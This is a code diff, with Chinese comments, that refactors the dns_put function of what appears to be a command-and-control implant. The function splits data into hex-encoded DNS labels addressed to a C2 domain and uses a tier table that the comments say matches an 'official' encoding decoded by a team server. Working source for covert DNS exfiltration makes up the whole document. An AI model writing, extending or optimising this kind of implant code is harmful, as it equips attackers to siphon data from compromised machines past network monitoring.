@@ -164,6 +164,28 @@ unsigned int dns_get6(char * domain, char * buffer, int max) {
 	return size;
 }
 
+/* 档位表：字节数 -> tier 字符 + 各 label 的 dword 数。与官方手写 12 档
+ * _snprintf 梯子逐字节同构（TS 按此形状解码），只是把 ~700B 的 .rdata
+ * 格式串与 26 参调用收敛成一个循环。 */
+static const struct {
+	int          bytes;
+	char         tier;
+	unsigned char labels[4];
+} DNS_CHUNK[12] = {
+	{104, '4', {8, 9, 9, 0}},
+	{ 84, '3', {7, 7, 7, 0}},
+	{ 56, '2', {7, 7, 0, 0}},
+	{ 48, '2', {6, 6, 0, 0}},
+	{ 40, '2', {5, 5, 0, 0}},
+	{ 28, '1', {7, 0, 0, 0}},
+	{ 24, '1', {6, 0, 0, 0}},
+	{ 20, '1', {5, 0, 0, 0}},
+	{ 16, '1', {4, 0, 0, 0}},
+	{ 12, '1', {3, 0, 0, 0}},
+	{  8, '1', {2, 0, 0, 0}},
+	{  4, '1', {1, 0, 0, 0}},
+};
+
 void dns_put(char * type, char * domain, char * buffer, int length) {
 	unsigned int sent = 0;
 	unsigned int data = 0;
@@ -179,91 +201,36 @@ void dns_put(char * type, char * domain, char * buffer, int length) {
 	reqno++;
 
 	while (sent < length) {
-		/* we need to reset this! */
+		static const char hx[] = "0123456789abcdef";
+		char  hex[26 * 8 + 4];
+		int   t, li, n2, k, hl, shift;
+		unsigned int be;
+
+		/* 逐级降档：先按剩余长度选最大档，构建后若 >= maxdns 再降。4 字节
+		   档是终极回落，与官方一致不做剩余长度检查。 */
 		maybe = 0;
-
-		/* send 104 bytes = 26 single requests */
-		if ((sent + 104) <= length) {
-			memcpy((void *)&dataz, buffer + sent, 104);
-			_snprintf(c2domain, 1024, "%s4%08x%08x%08x%08x%08x.%08x%08x%08x%08x%08x%08x%08x.%08x%08x%08x%08x%08x%08x%08x.%08x%08x%08x%08x%08x%08x%08x.%x%x.%s", type, htonl(dataz[0]), htonl(dataz[1]), htonl(dataz[2]), htonl(dataz[3]), htonl(dataz[4]), htonl(dataz[5]), htonl(dataz[6]), htonl(dataz[7]), htonl(dataz[8]), htonl(dataz[9]), htonl(dataz[10]), htonl(dataz[11]), htonl(dataz[12]), htonl(dataz[13]), htonl(dataz[14]), htonl(dataz[15]), htonl(dataz[16]), htonl(dataz[17]), htonl(dataz[18]), htonl(dataz[19]), htonl(dataz[20]), htonl(dataz[21]), htonl(dataz[22]), htonl(dataz[23]), htonl(dataz[24]), htonl(dataz[25]), reqno, nonce, domain);
-			maybe = 104;
-		}
-
-		/* send 84 bytes = 21 single requests */
-		if ((maybe == 0 || strlen(c2domain) >= maxdns) && (sent + 84) <= length) {
-			memcpy((void *)&dataz, buffer + sent, 84);
-			_snprintf(c2domain, 1024, "%s3%08x%08x%08x%08x%08x%08x%08x.%08x%08x%08x%08x%08x%08x%08x.%08x%08x%08x%08x%08x%08x%08x.%x%x.%s", type, htonl(dataz[0]), htonl(dataz[1]), htonl(dataz[2]), htonl(dataz[3]), htonl(dataz[4]), htonl(dataz[5]), htonl(dataz[6]), htonl(dataz[7]), htonl(dataz[8]), htonl(dataz[9]), htonl(dataz[10]), htonl(dataz[11]), htonl(dataz[12]), htonl(dataz[13]), htonl(dataz[14]), htonl(dataz[15]), htonl(dataz[16]), htonl(dataz[17]), htonl(dataz[18]), htonl(dataz[19]), htonl(dataz[20]), reqno, nonce, domain);
-			maybe = 84;
-		}
-
-		/* send 56 bytes = 14 single requests */
-		if ((maybe == 0 || strlen(c2domain) >= maxdns) && (sent + 56) <= length) {
-			memcpy((void *)&dataz, buffer + sent, 56);
-			_snprintf(c2domain, 1024, "%s2%08x%08x%08x%08x%08x%08x%08x.%08x%08x%08x%08x%08x%08x%08x.%x%x.%s", type, htonl(dataz[0]), htonl(dataz[1]), htonl(dataz[2]), htonl(dataz[3]), htonl(dataz[4]), htonl(dataz[5]), htonl(dataz[6]), htonl(dataz[7]), htonl(dataz[8]), htonl(dataz[9]), htonl(dataz[10]), htonl(dataz[11]), htonl(dataz[12]), htonl(dataz[13]), reqno, nonce, domain);
-			maybe = 56;
-		}
-
-		/* send 48 bytes = 12 single requests */
-		if ((maybe == 0 || strlen(c2domain) >= maxdns) && (sent + 48) <= length) {
-			memcpy((void *)&dataz, buffer + sent, 48);
-			_snprintf(c2domain, 1024, "%s2%08x%08x%08x%08x%08x%08x.%08x%08x%08x%08x%08x%08x.%x%x.%s", type, htonl(dataz[0]), htonl(dataz[1]), htonl(dataz[2]), htonl(dataz[3]), htonl(dataz[4]), htonl(dataz[5]), htonl(dataz[6]), htonl(dataz[7]), htonl(dataz[8]), htonl(dataz[9]), htonl(dataz[10]), htonl(dataz[11]), reqno, nonce, domain);
-			maybe = 48;
-		}
-
-		/* send 40 bytes = 10 single requests */
-		if ((maybe == 0 || strlen(c2domain) >= maxdns) && (sent + 40) <= length) {
-			memcpy((void *)&dataz, buffer + sent, 40);
-			_snprintf(c2domain, 1024, "%s2%08x%08x%08x%08x%08x.%08x%08x%08x%08x%08x.%x%x.%s", type, htonl(dataz[0]), htonl(dataz[1]), htonl(dataz[2]), htonl(dataz[3]), htonl(dataz[4]), htonl(dataz[5]), htonl(dataz[6]), htonl(dataz[7]), htonl(dataz[8]), htonl(dataz[9]), reqno, nonce, domain);
-			maybe = 40;
-		}
-
-		/* send 28 bytes = 7 single requests */
-		if ((maybe == 0 || strlen(c2domain) >= maxdns) && (sent + 28) <= length) {
-			memcpy((void *)&dataz, buffer + sent, 28);
-			_snprintf(c2domain, 1024, "%s1%08x%08x%08x%08x%08x%08x%08x.%x%x.%s", type, htonl(dataz[0]), htonl(dataz[1]), htonl(dataz[2]), htonl(dataz[3]), htonl(dataz[4]), htonl(dataz[5]), htonl(dataz[6]), reqno, nonce, domain);
-			maybe = 28;
-		}
-
-		/* send 24 bytes = 6 single requests */
-		if ((maybe == 0 || strlen(c2domain) >= maxdns) && (sent + 24) <= length) {
-			memcpy((void *)&dataz, buffer + sent, 24);
-			_snprintf(c2domain, 1024, "%s1%08x%08x%08x%08x%08x%08x.%x%x.%s", type, htonl(dataz[0]), htonl(dataz[1]), htonl(dataz[2]), htonl(dataz[3]), htonl(dataz[4]), htonl(dataz[5]), reqno, nonce, domain);
-			maybe = 24;
-		}
-
-		/* send 20 bytes = 5 single requests */
-		if ((maybe == 0 || strlen(c2domain) >= maxdns) && (sent + 20) <= length) {
-			memcpy((void *)&dataz, buffer + sent, 20);
-			_snprintf(c2domain, 1024, "%s1%08x%08x%08x%08x%08x.%x%x.%s", type, htonl(dataz[0]), htonl(dataz[1]), htonl(dataz[2]), htonl(dataz[3]), htonl(dataz[4]), reqno, nonce, domain);
-			maybe = 20;
-		}
-
-		/* send 16 bytes = 4 single requests */
-		if ((maybe == 0 || strlen(c2domain) >= maxdns) && (sent + 16) <= length) {
-			memcpy((void *)&dataz, buffer + sent, 16);
-			_snprintf(c2domain, 1024, "%s1%08x%08x%08x%08x.%x%x.%s", type, htonl(dataz[0]), htonl(dataz[1]), htonl(dataz[2]), htonl(dataz[3]), reqno, nonce, domain);
-			maybe = 16;
-		}
-
-		/* send 12 bytes = 3 single requests */
-		if ((maybe == 0 || strlen(c2domain) >= maxdns) && (sent + 12) <= length) {
-			memcpy((void *)&dataz, buffer + sent, 12);
-			_snprintf(c2domain, 1024, "%s1%08x%08x%08x.%x%x.%s", type, htonl(dataz[0]), htonl(dataz[1]), htonl(dataz[2]), reqno, nonce, domain);
-			maybe = 12;
-		}
-
-		/* send 8 bytes = 2 single requests */
-		if ((maybe == 0 || strlen(c2domain) >= maxdns) && (sent + 8) <= length) {
-			memcpy((void *)&dataz, buffer + sent, 8);
-			_snprintf(c2domain, 1024, "%s1%08x%08x.%x%x.%s", type, htonl(dataz[0]), htonl(dataz[1]), reqno, nonce, domain);
-			maybe = 8;
-		}
-
-		/* send 4 bytes = 1 single request */
-		if (maybe == 0 || strlen(c2domain) >= maxdns) {
-			memcpy((void *)&data, buffer + sent, 4);
-			_snprintf(c2domain, 1024, "%s1%08x.%x%x.%s", type, htonl(data), reqno, nonce, domain);
-			maybe = 4;
+		for (t = 0; t < 12; t++) {
+			int n = DNS_CHUNK[t].bytes;
+			if (t < 11 && (sent + n) > (unsigned int)length)
+				continue;
+			memcpy((void *)dataz, buffer + sent, n);
+			hl = 0;
+			k = 0;
+			for (li = 0; li < 4 && DNS_CHUNK[t].labels[li] != 0; li++) {
+				if (li > 0)
+					hex[hl++] = '.';
+				for (n2 = 0; n2 < DNS_CHUNK[t].labels[li]; n2++, k++) {
+					be = htonl(dataz[k]);
+					for (shift = 28; shift >= 0; shift -= 4)
+						hex[hl++] = hx[(be >> shift) & 0xf];
+				}
+			}
+			hex[hl] = '\0';
+			_snprintf(c2domain, 1024, "%s%c%s.%x%x.%s", type, DNS_CHUNK[t].tier, hex, reqno, nonce, domain);
+			if (t == 11 || strlen(c2domain) < maxdns) {
+				maybe = n;
+				break;
+			}
 		}
 
 		/* increment our sent pointer by the selected number of bytes */
